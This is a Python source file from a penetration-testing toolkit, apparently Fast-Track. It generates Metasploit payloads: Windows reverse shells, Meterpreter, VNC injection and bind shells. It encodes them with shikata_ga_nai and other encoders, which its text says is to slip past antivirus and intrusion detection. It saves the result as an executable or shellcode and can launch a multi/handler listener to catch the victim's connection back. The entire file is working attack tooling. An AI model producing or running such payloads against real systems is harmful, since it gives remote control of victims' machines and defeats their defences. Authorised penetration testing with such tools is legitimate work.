#!/usr/bin/env python
# Import modules
import subprocess,time,sys,os,re
definepath=os.getcwd()
sys.path.append("%s/bin/ftsrc/" % (definepath))
import include

# define metasploit path
meta_path=file("%s/config/fasttrack_config" % (definepath),"r").readlines()
for line in meta_path:
    line=line.rstrip()
    match=re.search("METASPLOIT_PATH",line)
    if match:
       line=line.replace("METASPLOIT_PATH=","")
       metapath=line

include.print_banner()
print """
    The Metasploit Payload Generator is a simple tool to
    make it extremely easy to generate a payload and listener 
    on the Metasploit framework. This does not actually
    exploit any systems, it will generate a metasploit payload 
    for you and save it to an executable. You then need to 
    someone get it on the remote server by yourself and get it 
    to execute correctly.

    This will also encode your payload to get past most AV and
    IDS/IPS.

"""
try:
   # Specify path to metasploit
   path=metapath
   # Specify payload
   choice1=raw_input('''    What payload do you want to generate:

    Name:                                Description:

    1. Windows Shell Reverse_TCP         Spawn a command shell on victim and send back to attacker.
    2. Windows Reverse_TCP Meterpreter   Spawn a meterpreter shell on victim and send back to attacker.
    3. Windows Reverse_TCP VNC DLL       Spawn a VNC server on victim and send back to attacker.
    4. Windows Bind Shell                Execute payload and create an accepting port on remote system.

    <ctrl>-c to Cancel

    Enter choice (example 1-6): ''')
   counter=0
   if choice1=='1': choice1=("windows/shell_reverse_tcp")
   if choice1=='2': choice1=("windows/meterpreter/reverse_tcp")
   if choice1=='3': 
      choice1=("windows/vncinject/reverse_tcp")
      shell=raw_input("Do you want a courtesy shell yes or no: ")
      if shell=='yes' or shell=='y': courtesyshell=("DisableCourtesyShell=True")
      if shell=='no' or shell=='no': courtesyshell=("")
      counter=counter+1
   if counter==0: courtesyshell=("")
   if choice1=='4': choice1=("windows/shell_bind_tcp")
   # Specify Encoding Option
   # re-clear the screen
   include.print_banner()
   encode=raw_input('''
    Below is a list of encodings to try and bypass AV. 

    Select one of the below, Avoid_UTF8_tolower usually gets past them.

    1. avoid_utf8_tolower
    2. shikata_ga_nai
    3. alpha_mixed
    4. alpha_upper
    5. call4_dword_xor
    6. countdown
    7. fnstenv_mov
    8. jmp_call_additive
    9. nonalpha
    10. nonupper
    11. unicode_mixed
    12. unicode_upper
    13. alpha2
    14. No Encoding

    Enter your choice : ''')
   if encode=='1': encode=("ENCODING=avoid_utf8_tolower")
   if encode=='2': encode=("ENCODING=shikata_ga_nai")
   if encode=='3': encode=("ENCODING=alpha_mixed")
   if encode=='4': encode=("ENCODING=alpha_upper")
   if encode=='5': encode=("ENCODING=call4_dword_xor")
   if encode=='6': encode=("ENCODING=countdown")
   if encode=='7': encode=("ENCODING=fnstenv_mov")
   if encode=='8': encode=("ENCODING=jmp_call_additive")
   if encode=='9': encode=("ENCODING=nonalpha")
   if encode=='10': encode=("ENCODING=nonupper")
   if encode=='11': encode=("ENCODING=unicode_mixed")
   if encode=='12': encode=("ENCODING=unicode_upper")
   if encode=='13': encode=("ENCODING=alpha2")
   if encode=='14': encode=("")

   # Specify Remote Host
   choice2=raw_input("\n    Enter IP Address of the listener/attacker (reverse) or host/victim (bind shell): ")
   choice3=raw_input("    Enter the port of the Listener: ")
   choice4=raw_input('''\n    Do you want to create an EXE or Shellcode 

    1. Executable
    2. Shellcode

    Enter your choice: ''')
   if choice4 =='1': 
      choice4=("X")
      choice5=("exe")
   if choice4 =='2': 
      choice4=("C") 
      choice5=("txt")
      # Coming soon...
      #restricted=raw_input("Do you want to avoid certain restricted characters, yes or no: ")
      #if restricted == 'yes' or restricted == 'y':
      #   restricted=raw_input(r"""
#Restricted characters are those that may get jacked up within
#the stack. Which ones would you like to avoid.
#
#Example: \x00\xff
#
#Which chars would you like to restrict: """)
#         restrict=(r"-b " + "'"+restricted+"'")
#      if restricted == 'no' or restricted == 'n' : restrict = ''
   generatepayload=subprocess.Popen(r"%smsfpayload %s LHOST=%s LPORT=%s %s %s %s > payload.%s" % (path,choice1,choice2,choice3,encode,courtesyshell,choice4,choice5), shell=True).wait()     
   print "\n\n    A payload has been created in this directory and is named 'payload.%s'. Enjoy!\n\n" % (choice5)

   # Start listener code
   listener=raw_input("    Do you want to start a listener to receive the payload yes or no: ")
   if listener=='yes' or listener =='y':
      # if they want a listener, start here
      print "\n    Launching Listener..."
      # launch actual listener
      print "***********************************************************************************************"
      print """\n    Launching MSFCLI on 'exploit/multi/handler' with PAYLOAD='%s' 
Listening on IP: %s on Local Port: %s Using encoding: %s\n""" % (choice1, choice2, choice3, encode)
      print "***********************************************************************************************"
      listeerlaunch=subprocess.Popen("%s/msfcli exploit/multi/handler PAYLOAD=%s LHOST=%s LPORT=%s %s E" % (path,choice1,choice2,choice3,encode), shell=True).wait()
   else: 
      print "\n\n    Exiting PayloadGen...Hack the gibson....\n\n"
      sys.exit(1)
   
# Catch all errors
except KeyboardInterrupt: print "\n\n    Keyboard Interrupt Detected, exiting Payload Gen.\n"
except Exception,e: 
   print "    Something went wrong, printing error message.." 
   print e

